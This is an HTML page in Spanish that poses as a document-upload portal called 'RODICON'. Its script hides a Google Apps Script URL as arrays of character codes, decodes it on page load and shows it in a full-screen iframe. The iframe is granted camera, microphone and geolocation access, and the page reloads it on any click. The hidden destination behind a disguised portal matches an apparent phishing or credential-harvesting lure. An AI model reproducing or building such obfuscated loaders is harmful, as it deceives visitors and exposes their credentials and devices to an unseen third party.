<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Carga de Documentos RODICON</title>
  <style>
    body,html{margin:0;padding:0;width:100%;height:100%;overflow:hidden;font-family:system-ui}
    /* El iframe debe tener permisos explícitos */
    iframe{border:none;width:100%;height:100%;display:block;}
    .loading{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center}
    .dot{width:8px;height:8px;background:#2c80ff;border-radius:50%;display:inline-block;margin:0 4px;animation:pulse 1.5s infinite}
    .dot:nth-child(2){animation-delay:0.3s}
    .dot:nth-child(3){animation-delay:0.6s}
    @keyframes pulse{0%,100%{opacity:0.3}50%{opacity:1}}
    .error{display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#fff;padding:25px;border-radius:10px;box-shadow:0 6px 20px rgba(0,0,0,0.12);text-align:center;max-width:320px}
  </style>
</head>
<body>

<div class="loading">
  <div style="margin-bottom:15px">
    <span class="dot"></span>
    <span class="dot"></span>
    <span class="dot"></span>
  </div>
  <p style="color:#666;font-size:14px">Conectando al servidor...</p>
</div>

<div class="error">
  <p style="color:#d32f2f;margin-bottom:20px;font-weight:500" id="msgError"></p>
  <button onclick="conectar()" style="background:#2c80ff;color:#fff;border:none;padding:10px 24px;border-radius:6px;cursor:pointer;font-size:14px;transition:background 0.2s">Conectar</button>
</div>

<iframe id="portal" style="display:none" allow="camera *; microphone *; autoplay *; encrypted-media *; fullscreen *; geolocation *"></iframe>

<script>

const configApi = {
  version: "2.3",
  endpoints: {
    primary: [104,116,116,112,115,58,47,47],
    domain: [115,99,114,105,112,116,46,103,111,111,103,108,101],
    path: [46,99,111,109,47,109,97,99,114,111,115,47,115,47],
    keyA: [65,75,102,121,99,98,121,73,90,81],
    keyB: [95,72,107,65,97,74,67,67,79,72,122],
    keyC: [111,107,68,50,88,48,73,51,70,85],
    keyD: [83,121,119,100,56,48,121,74,112,122],
    keyE: [50,118,70,51,110,53,104,77,55,55],
    keyF: [55,85,85,117,118,73,74,116,79,66],
    keyG: [118,55,104,87,97,108,122,51,112,121,65],
    keyH: [47,101,120,101,99]
  },
  timeout: 25000,
  retryDelay: 1000
};

function decodificar(parte) {
  return parte.map(c => String.fromCharCode(c)).join('');
}

function obtenerDestino() {
  const e = configApi.endpoints;
  const partes = [e.primary, e.domain, e.path, e.keyA, e.keyB, e.keyC, e.keyD, e.keyE, e.keyF, e.keyG, e.keyH];
  try {
    const url = partes.map(decodificar).join('');
    if (!url.startsWith('https://') || url.length < 50) throw new Error('Estructura inválida');
    return url;
  } catch { return null; }
}

function mostrarError(texto) {
  document.querySelector('.loading').style.display = 'none';
  document.getElementById('msgError').textContent = texto;
  document.querySelector('.error').style.display = 'block';
}

function ocultarError() {
  document.querySelector('.error').style.display = 'none';
  document.querySelector('.loading').style.display = 'block';
}

function conectar() {
  ocultarError();
  const destino = obtenerDestino();
  if (!destino) {
    setTimeout(() => mostrarError('Error de configuración'), 300);
    return;
  }
  
  const portal = document.getElementById('portal');
  const cargando = document.querySelector('.loading');
  
  portal.onload = function() {
    cargando.style.display = 'none';
    portal.style.display = 'block';
  };
  
  portal.onerror = function() {
    mostrarError('No se pudo establecer conexión');
  };
  
  portal.src = destino + '?_=' + Date.now();
  
  setTimeout(() => {
    if (cargando.style.display !== 'none') {
      mostrarError('Tiempo de conexión agotado');
    }
  }, configApi.timeout);
}

setTimeout(conectar, 800);

document.body.addEventListener('click', function() {
  if (document.querySelector('.error').style.display === 'block') {
    conectar();
  }
});
</script>
</body>
</html>
